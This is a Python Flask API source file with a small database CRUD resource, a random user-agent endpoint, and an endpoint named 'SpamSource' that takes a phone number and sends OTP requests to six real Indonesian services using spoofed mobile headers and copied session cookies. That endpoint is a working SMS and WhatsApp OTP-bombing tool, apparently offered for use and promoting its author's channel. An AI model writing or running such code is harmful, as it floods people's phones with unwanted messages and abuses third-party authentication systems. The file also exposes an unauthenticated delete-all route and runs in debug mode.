import re
from urllib import response
from flask import Flask,request
from flask_restful import Resource, Api
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from fake_useragent import UserAgent
import os,requests,json

app=Flask(__name__)
api=Api(app)

CORS(app)

db = SQLAlchemy(app)

basedir=os.path.dirname(os.path.abspath(__file__))
database="sqlite:///" + os.path.join(basedir,"db.sqlite")
app.config["SQLALCHEMY_DATABASE_URI"] = database

class ViewData(db.Model):
    id=db.Column(db.Integer,primary_key=True)
    nama=db.Column(db.String(100))
    umur=db.Column(db.Integer)
    token=db.Column(db.TEXT)

    def save(self):
        try:
            db.session.add(self)
            db.session.commit()
            return True
        except:
            return False

db.create_all()

identitas={}

class TestingSource(Resource):
    def get(self):
        #response={"msg":"Success Build Rest Api"}
        useragent=UserAgent()
        ua=useragent.random
        query=ViewData.query.all()
        output=[
            ({
                "id":data.id,
                "nama":data.nama,
                "umur":data.umur,
                "token":data.token
            }) 
            for data in query
        ]
        response=({
            "code" : 200,
            "mssg" : "Query data success",
            "data" : output
        })
        return response, 200

    def post(self):
        dataNama=request.form["nama"]
        dataUmur=request.form["umur"]
        dataToken=request.form["token"]

        model=ViewData(nama=dataNama,umur=dataUmur,token=dataToken)
        model.save()

        response=({
            "msg" : "Success add data",
            "code": 200
        })
        return response, 200
    def delete(self):
        query=ViewData.query.all()
        for data in query:
            db.session.delete(data)
            db.session.commit()

        response={
            "mssg": "Success delete all data",
            "reponse code": 200
        }

        return response, 200


class UpdateSource(Resource):
    def put(self,id):
        query=ViewData.query.get(id)
        editNama = request.form["nama"]
        editUmur=request.form["umur"]
        editToken=request.form["token"]

        query.nama = editNama
        query.umur = editUmur
        query.token = editToken

        response={
            "mssg": "Success Edit Data",
            "code": 200
        }

        return response

    def delete(self,id):
        queryData=ViewData.query.get(id)

        db.session.delete(queryData)
        db.session.commit()

        response={
            "mssg": "Success delete data",
            "code": 200
        }

        return response

class RandomUa(Resource):
    def get(self):
        useragent=UserAgent()
        ua=useragent.random
        return ({
            "user-agent": ua,
            "response code": 200,
            "creator": "Ammar-Excuted"
        })

class SpamSource(Resource):
    def post(self):
        nomor=request.form.get('nomor')
        if not nomor:
             return (
             {
                "mssg": "error",
                "respon": "masukkan nomor dengan benar.",
                "code": 404
             }
        )
        req=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
        p=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        pos=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        gas=requests.post("https://eci.id/api/signup",headers={'Host':'eci.id','Connection':'keep-alive','Content-Length':'27','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Accept':'application/json, text/plain, */*','Content-Type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'Android','Origin':'https://eci.id','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://eci.id/register','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={'Cookie':'auth.strategy=local; _ga=GA1.2.1528536964.1662047613; _gid=GA1.2.1590180614.1662047613; _gat=1; _fbp=fb.1.1662047613938.1765839161'},data=json.dumps({"identity":"0"+nomor})).text
        head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
        response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',})
        if "PENDING" in AmmarGanz:
             return (
             {
                "mssg": "success",
                "respon": "subscribe channel ammar executed.",
                "code": 200
             }
        )
        else:
             return (
             {
                "mssg": "limited code please wait 1 hours",
                "respon": "subscribe channel ammar executed",
                "code": 404
             }
        )

api.add_resource(TestingSource, "/first", methods=["GET", "POST", "DELETE"])
api.add_resource(UpdateSource, "/first/<id>", methods=["PUT","DELETE"])
api.add_resource(RandomUa, "/first/api/user-agent", methods=["GET"])
api.add_resource(SpamSource, "/first/api/sms")

if __name__ == "__main__":
    app.run(debug=True, port=5005)